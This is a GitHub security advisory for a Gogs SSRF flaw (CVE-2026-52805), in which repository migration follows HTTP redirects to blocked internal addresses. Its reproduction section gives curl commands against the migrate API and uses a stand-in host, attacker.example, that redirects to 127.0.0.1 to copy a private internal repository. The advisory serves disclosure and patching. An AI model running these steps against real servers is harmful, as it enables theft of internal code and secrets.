# [H] Gogs has a Migration Redirect Bypass that Leads to Internal Repository Theft

## Summary
Severity: High
Advisory: GHSA-g2f5-gjr4-qjvm
CVE: CVE-2026-52805
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-g2f5-gjr4-qjvm
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.3

## Details
# Migration URL validation bypass via HTTP redirect to blocked internal endpoints

## Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in the repository migration functionality. The application validates only the initially submitted URL hostname, but `git clone --mirror` follows HTTP redirects. An authenticated user can submit a public URL that redirects to a blocked internal endpoint (e.g., `127.0.0.1`), importing the internal repository's contents into an attacker-controlled repository.

## Vulnerability Details

The vulnerability is located in `internal/form/repo.go`. `ParseRemoteAddr()` validates the clone address hostname against a blocklist of local and private-network addresses. However, the actual migration is performed by `git clone --mirror` in `internal/database/repo.go`, which follows HTTP redirects without revalidation:

1. Attacker submits `http://attacker.example/redirect.git` — passes validation (public hostname).
2. Attacker's server responds with `302` redirect to `http://127.0.0.1:18081/victim/private.git`.
3. Git follows the redirect and clones the internal repository.
4. Gogs imports the cloned contents into the attacker's new repository.

The root cause is that Gogs validates only the initial URL and does not revalidate the final redirect target.

## Impact

This vulnerability bypasses the intended localhost/private-network migration restriction. Any authenticated user who can migrate repositories can import contents from internal Git endpoints reachable from the Gogs server. This allows attackers to:

- Steal source code and secrets from internal repositories served over HTTP.
- Scan internal network services via the migration endpoint.

## Reproduction Steps

Prerequisites: a Gogs instance, an attacker account that can create repositories.

1. Start a local HTTP Git server with a test repository on `127.0.0.1:18081`.
2. Start a redirect server that responds to any request with a `302` redirect to `http://127.0.0.1:18081/victim/private.git`.
3. Verify the direct localhost URL is blocked:
```bash
curl -sS -X POST -H "Authorization: token ${TOKEN}" \
  -H "Content-Type: application/json" \
  --data '{"clone_addr":"http://127.0.0.1:18081/victim/private.git","uid":2,"repo_name":"blocked"}' \
  "${GOGS_URL}/api/v1/repos/migrate"
```
Result: rejected as blocked local address.

4. Submit a public-looking URL that redirects to the blocked endpoint:
```bash
curl -sS -X POST -H "Authorization: token ${TOKEN}" \
  -H "Content-Type: application/json" \
  --data '{"clone_addr":"http://attacker.example/redirect.git","uid":2,"repo_name":"stolen","private":true}' \
  "${GOGS_URL}/api/v1/repos/migrate"
```
Result: migration succeeds. The new repository contains the internal repository's contents.

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-g2f5-gjr4-qjvm
- https://nvd.nist.gov/vuln/detail/CVE-2026-52805
- https://github.com/gogs/gogs/pull/8324
- https://github.com/gogs/gogs/commit/b9a0093e9cd1b2b3c7f42f9feca396dc772c4f1b
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/releases/tag/v0.14.3
